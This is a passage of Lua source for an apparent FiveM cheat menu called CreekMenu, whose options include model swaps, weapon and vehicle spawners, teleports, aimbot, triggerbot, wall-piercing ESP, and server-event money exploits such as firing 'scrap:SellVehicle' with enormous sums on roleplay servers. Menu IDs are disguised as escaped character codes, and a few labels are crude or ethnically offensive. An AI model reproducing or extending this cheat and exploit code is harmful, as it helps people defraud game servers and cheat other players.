            elseif CreekMenu.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif CreekMenu.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
            ...
            elseif CreekMenu.IsMenuOpened('modifyskintextures') then
                ...
                if CreekMenu.MenuButton("Head", "modifyhead") then

					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
						CreekMenu.CloseMenu()
						CreekMenu.OpenMenu('modifyskintextures')
				...
				elseif CreekMenu.IsMenuOpened('skinsmodels') then

if CreekMenu.Button("~s~Reset Model To FiveM Player") then
	...
	elseif CreekMenu.Button("Change To ~r~Clown") then
			...
			elseif CreekMenu.Button("Change To ~r~Ortega") then
			local model = "csb_ortega"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif CreekMenu.Button("Change To ~r~Stranger") then
			local model = "csb_ramp_hipster"
				...
				if HasModelLoaded(GetHashKey(model)) then
                    ...
                    elseif CreekMenu.Button("Change To ~r~Ramp Gang") then    
			local model = "csb_ramp_mex"
                ...
                elseif CreekMenu.Button("Change To ~r~Jew") then
                    local model = "a_m_y_hasjew_01"
                        ...
                        elseif CreekMenu.Button("Change To ~r~Alien") then
                            ...
                            elseif CreekMenu.Button("Change To ~r~Monkey") then
                            local model ="a_c_chimp"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                        elseif CreekMenu.Button("Change To ~r~Slaughter") then
                            local model ="ig_chef2"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~S_Lausen") then
                            local model ="u_m_y_imporage"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                        elseif CreekMenu.Button("Change To ~r~Rollespilleren") then
                            local model ="u_m_y_babyd"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~Blackops") then
                            local model ="s_m_y_blackops_01"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                        elseif CreekMenu.Button("Change To ~r~Jesus") then
                            local model ="u_m_m_jesus_01"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~Pappa") then
                            local model ="mp_m_weapexp_01"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~Motherfucker") then
                            local model ="u_m_y_juggernaut_01"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~Mexicano") then
                            local model ="u_m_y_mani"
                            RequestModel(GetHashKey(model))
                            if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif CreekMenu.Button("Change To ~r~Criminal") then
				...
				elseif CreekMenu.Button("Change To ~r~Vagos President") then
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif CreekMenu.Button("Change To ~r~Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif CreekMenu.Button("Change To ~r~Arnold Schwarzenegger") then
			local model = "u_m_y_babyd"
				RequestModel(GetHashKey(model))
                ...
                -- Head Menu
                elseif CreekMenu.IsMenuOpened('modifyhead') then
                    if CreekMenu.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
					...
					elseif CreekMenu.ComboBox2("Face Texture", faceTexturesList, currFtextureIndex, selFtextureIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif CreekMenu.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif CreekMenu.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif CreekMenu.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif CreekMenu.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
					...
					elseif CreekMenu.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
				...
				elseif CreekMenu.IsMenuOpened('WeaponCustomization') then
                    if CreekMenu.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                    currPFuncIndex = currentIndex
                    selPFuncIndex = currentIndex
					  end) then
                    if selPFuncIndex == 1 then
                ...
                elseif CreekMenu.Button("~s~Add ~s~Special Finish") then
                ...
                elseif CreekMenu.Button("~s~Remove ~s~Special Finish") then
                ...
                elseif CreekMenu.Button("~s~Add ~s~Suppressor") then
                ...
                elseif CreekMenu.Button("~s~Remove ~s~Suppressor") then
                ...
                elseif CreekMenu.Button("~s~Add ~s~Scope") then
                ...
                elseif CreekMenu.Button("~s~Remove ~s~Scope") then
        ...
        -- WEAPON OPTIONS MENU
        elseif CreekMenu.IsMenuOpened('\119\101\97\112\111\110\10') then
            if CreekMenu.MenuButton("~s~Give ~s~Single Weapon", '\119\101\97\112\111\110\115\112\97\119\110\101\114\10') then
                selectedPlayer = PlayerId()
			elseif CreekMenu.MenuButton("Weapon Customization", "WeaponCustomization") then
                selectedPlayer = PlayerId()
            elseif CreekMenu.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
            elseif CreekMenu.Button("Remove All Weapons") then
                StripPlayer(PlayerId())
			elseif CreekMenu.Button("Remove Ammo") then
                SetPedAmmo(GetPlayerPed(-1), 0)
            elseif CreekMenu.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif CreekMenu.ComboBox(
                ...
                function(currentIndex, selectedIndex)
                    ...
                    then
            elseif CreekMenu.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif CreekMenu.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif CreekMenu.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
            elseif CreekMenu.CheckBox("Super Damage", SuperDamage) then
            ...
            elseif CreekMenu.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif CreekMenu.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif CreekMenu.ComboBox("Aimbot Bone Target", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif CreekMenu.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif CreekMenu.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif CreekMenu.CheckBox("~u~Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end


        -- SPECIFIC WEAPON MENU
        elseif CreekMenu.IsMenuOpened('\119\101\97\112\111\110\115\112\97\119\110\101\114\10') then
            if CreekMenu.MenuButton('Melee Weapons', 'melee') then
            elseif CreekMenu.MenuButton('Pistols', 'pistol') then
            elseif CreekMenu.MenuButton('SMGs / MGs', 'smg') then
            elseif CreekMenu.MenuButton('Shotguns', 'shotgun') then
            elseif CreekMenu.MenuButton('Assault Rifles', 'assault') then
            elseif CreekMenu.MenuButton('Sniper Rifles', 'sniper') then
            elseif CreekMenu.MenuButton('Thrown Weapons', 'thrown') then
            elseif CreekMenu.MenuButton('Heavy Weapons', 'heavy') then
			end

        -- MELEE WEAPON MENU
        elseif CreekMenu.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if CreekMenu.Button("~r~» ~s~"..meleeweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, meleeweapons[i][1])
                end
            end
        -- PISTOL MENU
        elseif CreekMenu.IsMenuOpened('pistol') then
			for i = 1, #pistolweapons do
                if CreekMenu.Button("~r~» ~s~"..pistolweapons[i][2].."") then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
				elseif CreekMenu.Button("Remove ~r~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
                end
            end
        -- SMG MENU
        elseif CreekMenu.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if CreekMenu.Button("~r~» ~s~"..smgweapons[i][2].."") then
        ...
        -- SHOTGUN MENU
        elseif CreekMenu.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if CreekMenu.Button("~r~» ~s~"..shotgunweapons[i][2].."") then
        ...
        -- ASSAULT RIFLE MENU
        elseif CreekMenu.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if CreekMenu.Button("~r~» ~s~"..assaultweapons[i][2].."") then
        ...
        -- SNIPER MENU
        elseif CreekMenu.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if CreekMenu.Button("~r~» ~s~"..sniperweapons[i][2].."") then
        ...
        -- THROWN WEAPON MENU
        elseif CreekMenu.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if CreekMenu.Button("~r~» ~s~"..thrownweapons[i][2].."") then
        ...
        -- HEAVY WEAPON MENU
        elseif CreekMenu.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if CreekMenu.Button("~r~» ~s~"..heavyweapons[i][2].."") then
        ...
        elseif CreekMenu.IsMenuOpened('\118\101\104\105\99\108\101\10') then
            if CreekMenu.MenuButton("Vehicle Spawner", '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10') then
                elseif CreekMenu.MenuButton("~s~Vehicle Mods", 'vehiclemods') then
                elseif CreekMenu.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
                elseif CreekMenu.ComboBox("Vehicle Functions| ~r~CHANGEABLE", {"Repair ~s~Vehicle", "Clean ~r~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
				...
				elseif CreekMenu.Button("Buy vehicle for free") then
				...
				elseif CreekMenu.CheckBox("Drift", driftMode) then
                    driftMode = not driftMode
                elseif CreekMenu.CheckBox("Collision", Collision) then
                    Collision = not Collision
                elseif CreekMenu.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                    ...
                    elseif CreekMenu.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                    ...
                    elseif CreekMenu.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
        ...
        -- VEHICLE SPAWNER MENU
        elseif CreekMenu.IsMenuOpened('\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10') then
            if CreekMenu.Button("Spawn Vehicle By Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            elseif CreekMenu.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                PlaceSelf = not PlaceSelf
            elseif CreekMenu.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                SpawnInAir = not SpawnInAir
            elseif CreekMenu.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                SpawnEngineOn = not SpawnEngineOn
            elseif CreekMenu.MenuButton('Compacts', 'compacts') then
            elseif CreekMenu.MenuButton('Sedans', 'sedans') then
            elseif CreekMenu.MenuButton('SUVs', 'suvs') then
            elseif CreekMenu.MenuButton('Coupes', 'coupes') then
            elseif CreekMenu.MenuButton('Muscle', 'muscle') then
            elseif CreekMenu.MenuButton('Sports Classics', 'sportsclassics') then
            elseif CreekMenu.MenuButton('Sports', 'sports') then
            elseif CreekMenu.MenuButton('Super', 'super') then
            elseif CreekMenu.MenuButton('Motorcycles', 'motorcycles') then
            elseif CreekMenu.MenuButton('Off-Road', 'offroad') then
            elseif CreekMenu.MenuButton('Industrial', 'industrial') then
            elseif CreekMenu.MenuButton('Utility', 'utility') then
            elseif CreekMenu.MenuButton('Vans', 'vans') then
			elseif CreekMenu.MenuButton('Cycles', 'cycles') then
			elseif CreekMenu.MenuButton('Boats', 'boats') then
			elseif CreekMenu.MenuButton('Helicopters', 'helicopters') then
			elseif CreekMenu.MenuButton('Planes', 'planes') then
			elseif CreekMenu.MenuButton('Service/Emergency/Military', 'service') then
			elseif CreekMenu.MenuButton('Commercial/Trains', 'commercial') then
			end

        -- COMPACTS SPAWNER
        elseif CreekMenu.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                ...
                local carButton = CreekMenu.Button(vehname)
                if carButton then
        ...
        -- SEDANS SPAWNER
        elseif CreekMenu.IsMenuOpened('sedans') then
            for i = 1, #sedans do
        ...
        -- SUVs SPAWNER
        elseif CreekMenu.IsMenuOpened('suvs') then
            for i = 1, #suvs do
        ...
        -- COUPES SPAWNER
        elseif CreekMenu.IsMenuOpened('coupes') then
            for i = 1, #coupes do
        ...
        -- MUSCLE SPAWNER
        elseif CreekMenu.IsMenuOpened('muscle') then
            for i = 1, #muscle do
        ...
        elseif CreekMenu.IsMenuOpened('sportsclassics') then
        ...
        -- SPORTS SPAWNER
        elseif CreekMenu.IsMenuOpened('sports') then
            for i = 1, #sports do
        ...
        -- SUPER SPAWNER
        elseif CreekMenu.IsMenuOpened('super') then
            for i = 1, #super do
        ...
        -- MOTORCYCLES SPAWNER
        elseif CreekMenu.IsMenuOpened('motorcycles') then
        ...
        -- OFFROAD SPAWNER
        elseif CreekMenu.IsMenuOpened('offroad') then
            for i = 1, #offroad do
        ...
        -- INDUSTRIAL SPAWNER
        elseif CreekMenu.IsMenuOpened('industrial') then
        ...
        -- UTILITY SPAWNER
        elseif CreekMenu.IsMenuOpened('utility') then
            for i = 1, #utility do
        ...
        -- VANS SPAWNER
        elseif CreekMenu.IsMenuOpened('vans') then
            for i = 1, #vans do
        ...
        -- CYCLES SPAWNER
        elseif CreekMenu.IsMenuOpened('cycles') then
            for i = 1, #cycles do
        ...
        -- BOATS SPAWNER
        elseif CreekMenu.IsMenuOpened('boats') then
            for i = 1, #boats do
        ...
        -- HELICOPTERS SPAWNER
        elseif CreekMenu.IsMenuOpened('helicopters') then
        ...
        -- PLANES SPAWNER
        elseif CreekMenu.IsMenuOpened('planes') then
            for i = 1, #planes do
        ...
        -- SERVICE SPAWNER
        elseif CreekMenu.IsMenuOpened('service') then
            for i = 1, #service do
        ...
        -- COMMERCIAL SPAWNER
        elseif CreekMenu.IsMenuOpened('commercial') then
        ...
        -- VEHICLE MODS MENU
        elseif CreekMenu.IsMenuOpened('vehiclemods') then
            if CreekMenu.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif CreekMenu.MenuButton("Tune Vehicle", 'vehicletuning') then
                elseif CreekMenu.Button("Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
                elseif CreekMenu.Button("~s~Rainbow ~s~Vehicle Colour") then
			ra = RGBRainbow(1.0)
			...
			elseif CreekMenu.Button("~s~Rainbow ~w~Vehicle Neon Ligths") then
        ...
        -- VEHICLE COLORS MENU
        elseif CreekMenu.IsMenuOpened('vehiclecolors') then
            if CreekMenu.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif CreekMenu.MenuButton("Secondary Color", 'vehiclecolors_secondary') then

            end

        elseif CreekMenu.IsMenuOpened('vehiclecolors_primary') then
            if CreekMenu.MenuButton("Classic Colors", 'primary_classic') then
                elseif CreekMenu.MenuButton("Matte Colors", 'primary_matte') then
                elseif CreekMenu.MenuButton("Metals", 'primary_metal') then
            end

        elseif CreekMenu.IsMenuOpened('vehiclecolors_secondary') then
            if CreekMenu.MenuButton("Classic Colors", 'secondary_classic') then
                elseif CreekMenu.MenuButton("Matte Colors", 'secondary_matte') then
                elseif CreekMenu.MenuButton("Metals", 'secondary_metal') then
            end

        -- PRIMARY CLASSIC
        elseif CreekMenu.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if CreekMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
        ...
        -- PRIMARY MATTE
        elseif CreekMenu.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if CreekMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
        ...
        -- PRIMARY METAL
        elseif CreekMenu.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if CreekMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
        ...
        -- SECONDARY CLASSIC
        elseif CreekMenu.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if CreekMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
        ...
        -- SECONDARY MATTE
        elseif CreekMenu.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if CreekMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
        ...
        -- SECONDARY METAL
        elseif CreekMenu.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if CreekMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
        ...
        -- VEHICLE TUNING MENU
        elseif CreekMenu.IsMenuOpened('vehicletuning') then
		   if CreekMenu.Button("Max ~r~Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
		elseif CreekMenu.Button("Max ~r~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
		elseif CreekMenu.Button("Max All ~r~Tuning") then
					engine1(GetVehiclePedIsUsing(PlayerPedId()))
		end


        -- VEHICLE MENU (WIP)
        elseif CreekMenu.IsMenuOpened('vehiclemenu') then
            if CreekMenu.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
            ...
            elseif CreekMenu.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
            ...
            elseif CreekMenu.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then -- Is closing when the driver seat has someone
            ...
            elseif CreekMenu.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
            ...
            elseif CreekMenu.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
            ...
            elseif CreekMenu.CheckBox("Hood", FrontHood, "Closed", "Opened") then
            ...
            elseif CreekMenu.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
            ...
            elseif CreekMenu.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
            ...
            elseif CreekMenu.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
        ...
        -- WORLD OPTIONS MENU
        elseif CreekMenu.IsMenuOpened('\119\111\114\108\100\10') then
            if CreekMenu.MenuButton("Weather Changer | ~r~Client Side", 'weather') then
            elseif CreekMenu.MenuButton("Time Changer", 'time') then
            elseif CreekMenu.CheckBox("Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
            elseif CreekMenu.CheckBox("Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif CreekMenu.CheckBox("Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif CreekMenu.CheckBox("Noisy Cars", NoisyCars) then
            ...
            elseif CreekMenu.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
			 ...
			 elseif CreekMenu.IsMenuOpened('time') then
			  if CreekMenu.CheckBox("Christmas Weather", XMAS) then
                XMAS = not XMAS
				if XMAS then
        ...
        SetOverrideWeather("XMAS")
				...
				elseif CreekMenu.CheckBox("Blizzard Weather", BLIZZARD) then
		...
		elseif CreekMenu.CheckBox("Foggy Weather", FOGGY) then
                FOGGY = not FOGGY
				if FOGGY then
        ...
        -- OBJECT SPAWNER MENU
        elseif CreekMenu.IsMenuOpened('\111\98\106\101\99\116\115\112\97\119\110\101\114\10') then
            if CreekMenu.MenuButton("Spawned Objects", 'objectlist') then
            elseif CreekMenu.ComboBox("~s~Select~s~ To Object~r~ | CHANGEABLE", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
			elseif CreekMenu.Button("~s~Spawn ~s~Object") then
				local pos = GetEntityCoords(PlayerPedId())
            ...
            elseif CreekMenu.Button("Add Object By Name") then
            ...
            elseif CreekMenu.CheckBox("Visible", objVisible) then
                objVisible = not objVisible
            elseif CreekMenu.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                currDirectionIndex = currentIndex
                selDirectionIndex = currentIndex
            end) then
            elseif CreekMenu.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
        ...
        elseif CreekMenu.IsMenuOpened('objectlist') then
            if CreekMenu.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if CreekMenu.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
		...
		elseif CreekMenu.IsMenuOpened('weather') then
		    if CreekMenu.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif CreekMenu.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end

        -- MISC OPTIONS MENU
        elseif CreekMenu.IsMenuOpened('\109\105\115\99\10') then

			if CreekMenu.MenuButton("ESP & Visual", 'esp') then
            elseif CreekMenu.MenuButton("~s~Info", "InfoMenu") then
            elseif CreekMenu.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
			elseif CreekMenu.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
			elseif CreekMenu.MenuButton("Web Radio", 'webradio') then
            elseif CreekMenu.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                Radio = not Radio
                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
            elseif CreekMenu.CheckBox('Always Draw Crosshair', Crosshair) then
                Crosshair = not Crosshair
            elseif CreekMenu.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
            elseif CreekMenu.MenuButton('Credits', 'credits') then
            end

        
        elseif CreekMenu.IsMenuOpened("InfoMenu") then
            if CreekMenu.Button("~s~CreekMenu 1.2") then
            elseif CreekMenu.Button("~sb~CreekMenu | ~r~Phan#0002") then
            elseif CreekMenu.Button("~sb~CreekMenu | ~r~rofl#7288") then
            elseif CreekMenu.Button("~s~Developer | ~r~Phan#0002") then    
            elseif CreekMenu.Button("~s~Developer | ~r~rofl#7288") then                   
            elseif CreekMenu.Button("~s~Discord ~r~https://discord.gg/Zm9jg9q") then  
            end
            

		elseif CreekMenu.IsMenuOpened('esp') then
			if CreekMenu.CheckBox("Blips", BlipsEnabled) then
                ToggleBlips()
            elseif CreekMenu.CheckBox("Nametags", NametagsEnabled) then
            ...
            elseif CreekMenu.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
                ANametagsEnabled = not ANametagsEnabled
            elseif CreekMenu.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
                ANametagsNotNeedLOS = not ANametagsNotNeedLOS
			elseif CreekMenu.CheckBox("ESP", ESPEnabled) then
				ToggleESP()
            elseif CreekMenu.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
                currESPDistance = currentIndex
                selESPDistance = currentIndex
                EspDistance = ESPDistanceOps[currESPDistance]
            end) then
			elseif CreekMenu.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
            ...
            elseif CreekMenu.CheckBox("Lines", LinesEnabled) then
                LinesEnabled = not LinesEnabled
			end


        elseif CreekMenu.IsMenuOpened('webradio') then
            if CreekMenu.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
        ...
        elseif CreekMenu.IsMenuOpened('\116\101\108\101\112\111\114\116\10') then
            if CreekMenu.MenuButton('Tøjbutikker', 'saveload') then
            elseif CreekMenu.MenuButton('Garages', 'pois') then
            elseif CreekMenu.MenuButton('Places', 'pois2') then
            elseif CreekMenu.Button('Teleport To Waypoint') then
				TeleportToWaypoint()
            end


        elseif CreekMenu.IsMenuOpened('saveload') then
            if CreekMenu.Button("Hardwick") then
                SetEntityCoords(PlayerPedId(), 134.122055, -200.21133, 53.86409)

            elseif CreekMenu.Button("Sandy Shores") then
                SetEntityCoords(PlayerPedId(), 1197.0754394531,2698.8005371094,37.990936279297)
                
            elseif CreekMenu.Button("Paleto Bay") then
                    SetEntityCoords(PlayerPedId(), -4.5, 6521.2, 30.5)
            end


        elseif CreekMenu.IsMenuOpened('pois') then
            if CreekMenu.Button("Mors Mutual Insurance") then
                SetEntityCoords(PlayerPedId(), -221.74, -1158.24, 23.04)
            
            elseif CreekMenu.Button("Midtby Garage") then
                SetEntityCoords(PlayerPedId(), 215.66017150879,-788.88757324219, 30.827373504639)

                    
            elseif CreekMenu.Button("Bilforhandleren") then
                SetEntityCoords(PlayerPedId(), -15.169131278992, -1085.6313476563, 25.672069549561)

            end

        elseif CreekMenu.IsMenuOpened('pois2') then
            if CreekMenu.Button("Bilforhandleren") then
                SetEntityCoords(PlayerPedId(), -35.414115905762,-1107.6121826172,26.422357559204)

          
            elseif CreekMenu.Button("Politi Stationen") then
                SetEntityCoords(PlayerPedId(), 441.56, -982.9, 30.69)

            elseif CreekMenu.Button("FBI") then
            SetEntityCoords(PlayerId(), 134.39839172363,-766.44683837891,242.15205383301)

            elseif CreekMenu.Button("Midtby") then
        ...
        elseif CreekMenu.IsMenuOpened('\115\101\116\116\105\110\103\115\10') then
           if CreekMenu.ComboBox("~r~»  ~s~Menu ~r~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
            currentMenuX = currentIndex
            selectedMenuX = currentIndex
            for i = 1, #menulist do
                CreekMenu.SetMenuX(menulist[i], menuX[currentMenuX])
            end
            end)
            then
        elseif CreekMenu.ComboBox("~r~»  ~s~Menu ~r~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
            currentMenuY = currentIndex
            selectedMenuY = currentIndex
            for i = 1, #menulist do
                CreekMenu.SetMenuY(menulist[i], menuY[currentMenuY])
            end
            end)
            then
            end
        ...
        elseif CreekMenu.IsMenuOpened('\108\117\97\10') then
                if CreekMenu.MenuButton('vRP', '\118\114\112\10') then
                elseif CreekMenu.MenuButton('vRP Rollespilleren', 'roles') then
                elseif CreekMenu.MenuButton('----------', 'roles') then
                elseif CreekMenu.MenuButton('ESX', '\101\115\120\10') then
				elseif CreekMenu.MenuButton('ESX Jobs ', 'other') then
                
			end


        elseif CreekMenu.IsMenuOpened('money') then
            if CreekMenu.Button("SPAWN Penge | Pung", '~r~Devo & Sky') then         	         	
            ...
            elseif CreekMenu.Button("SPAWN Penge", '~r~DevoNetwork') then
            	local belob = GetKeyboardInput("Beløb")
            	udwdj("scrap:SellVehicle", belob)
            elseif CreekMenu.Button("SPAWN Andre Personer Penge", '~r~DevoNetwork') then
            	local i = 0
        ...
        elseif CreekMenu.IsMenuOpened('roles') then
        if CreekMenu.Button("==========================~r~PENGE~s~===========================") then
        elseif CreekMenu.Button("Modtage Penge #1", "~rp~Mange Servere") then
            TriggerServerEvent("scrap:SellVehicle", 15000000000000)
        elseif CreekMenu.Button("Modtag Penge #2", '~r~Mange Servere') then
        ...
